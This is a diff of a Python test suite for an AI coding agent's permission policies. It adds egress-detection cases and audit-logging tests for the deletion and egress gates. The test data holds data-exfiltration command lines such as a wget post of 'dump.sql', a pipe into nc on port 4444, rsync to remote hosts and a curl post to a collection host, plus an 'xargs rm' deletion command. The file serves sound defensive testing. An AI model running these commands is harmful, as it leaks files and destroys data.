@@ -3076,6 +3076,9 @@ if (malformedFinding.length === 0 || malformedElapsedMs > 1000) {
             {"fn": "egress", "path": "wget --post-file=dump.sql http://x.example", "matches": True},
             {"fn": "egress", "path": "scp notes.txt host:/tmp/", "matches": True},
             {"fn": "egress", "path": "rsync -a data/ user@host:backup/", "matches": True},
+            {"fn": "egress", "path": "rsync -a data/ host:backup/", "matches": True},
+            {"fn": "egress", "path": "rsync -a data/ host::module", "matches": True},
+            {"fn": "egress", "path": "rsync -a data/ rsync://host/mod", "matches": True},
             {"fn": "egress", "path": "cat report.md | nc example.com 4444", "matches": True},
             {"fn": "egress", "path": "git push origin main", "matches": True},
             {"fn": "egress", "path": "git push", "matches": True},
@@ -3086,6 +3089,9 @@ if (malformedFinding.length === 0 || malformedElapsedMs > 1000) {
             {"fn": "egress", "path": "git pull", "matches": False},
             {"fn": "egress", "path": "git fetch origin", "matches": False},
             {"fn": "egress", "path": "rsync -a src/ dst/", "matches": False},
+            {"fn": "egress", "path": "rsync -a src/ /abs/dest/", "matches": False},
+            {"fn": "egress", "path": "rsync -a --out-format=%f:%l src/ dst/", "matches": False},
+            {"fn": "egress", "path": "rsync -a 'src/a:b' dst/", "matches": False},
             {"fn": "egress", "path": "echo nc is a tool", "matches": False},
             {"fn": "egress", "path": "python3 -m unittest", "matches": False},
             {"fn": "egress", "path": "/usr/bin/curl -d x https://collect.example", "matches": True},
@@ -3696,6 +3702,102 @@ console.log('ok');
         self.assertEqual(rec["policy"], "protected path and secret access approval")
         self.assertEqual(rec["toolName"], "bash")
         self.assertIn("credential file (.aws/credentials)", rec["rule"])
+
+    def test_every_permission_policy_records_an_audit_request(self) -> None:
+        """Every installed policy module must call logPermissionRequest.
+
+        The audit log is only replayable policy evidence if no policy is
+        exempt: a gate that raises a prompt and writes no `request` row
+        leaves the incident readable as an outcome with no cause. The
+        indirect-deletion policy was that gap -- and it covers interpreter,
+        xargs and truncation routes, the most evasion-shaped category of
+        the five."""
+        policies = sorted(
+            path
+            for path in (ROOT / "permissions").glob("*.*")
+            if path.suffix in {".ts", ".js"}
+        )
+        self.assertEqual(
+            [path.name for path in policies],
+            [
+                "confirm-deletions.ts",
+                "confirm-egress.ts",
+                "destructive-patterns.js",
+                "protected-paths.ts",
+                "workspace-scope.ts",
+            ],
+            "policy module set changed; update this guard deliberately",
+        )
+        for policy in policies:
+            source = policy.read_text(encoding="utf-8")
+            with self.subTest(policy=policy.name):
+                self.assertIn(
+                    'from "./lib/audit.ts"',
+                    source,
+                    f"{policy.name} does not import the audit appender",
+                )
+                self.assertIn(
+                    "logPermissionRequest({",
+                    source,
+                    f"{policy.name} never records a request record",
+                )
+
+    def test_indirect_deletion_policy_logs_requests_without_content(self) -> None:
+        """destructive-patterns.js gates the indirect deletion routes --
+        interpreter, xargs, dd, tee, truncating redirection -- and must
+        evidence each one with a record naming the matched pattern and
+        nothing drawn from the command text."""
+        fixture = retained_on_failure_tmpdir(self, "policy-audit-indirect-")
+        build_policy_node_modules(self, fixture)
+        policy_copy = fixture / "destructive-patterns.js"
+        shutil.copy2(ROOT / "permissions" / "destructive-patterns.js", policy_copy)
+        shutil.copytree(ROOT / "permissions" / "lib", fixture / "lib")
+
+        agent = retained_on_failure_tmpdir(self, "policy-audit-indirect-agent-")
+        marker = "UNIQUE-CANARY-4b7e"
+        command = f"xargs rm < {marker}-list.txt"
+        case = {
+            "tool": {
+                "toolName": "bash",
+                "command": command,
+                "input": {"command": command},
+            },
+            "cwd": "/tmp/w",
+            "permissionRoot": "/tmp/w",
+        }
+        env = dict(os.environ)
+        env["PI_AGENT_DIR"] = str(agent)
+        env.pop("PI_AUDIT", None)
+        result = subprocess.run(
+            [
+                "node",
+                "--input-type=module",
+                "-e",
+                POLICY_HARNESS_SCRIPT,
+                str(policy_copy),
+                json.dumps([case]),
+            ],
+            cwd=fixture,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            env=env,
+            check=False,
+        )
+        self.assertEqual(result.returncode, 0, result.stdout)
+        self.assertIn('RESULTS:["request"]', result.stdout)
+
+        audit_dir = agent / "harness" / "audit"
+        files = list(audit_dir.iterdir())
+        self.assertEqual(len(files), 1, files)
+        raw = files[0].read_text(encoding="utf-8")
+        self.assertNotIn(marker, raw, "REDACTION: command text must never reach the log")
+        rec = json.loads(raw.strip().splitlines()[-1])
+        self.assertEqual(rec["kind"], "request")
+        self.assertEqual(rec["decision"], "request")
+        self.assertEqual(rec["policy"], "indirect deletion approval")
+        self.assertEqual(rec["toolName"], "bash")
+        self.assertEqual(rec["rule"], "xargs deletion")
 
     def test_protected_paths_policy_redacts_system_credential_paths(self) -> None:
         """isSecretFile()'s system-credential branches (system credential
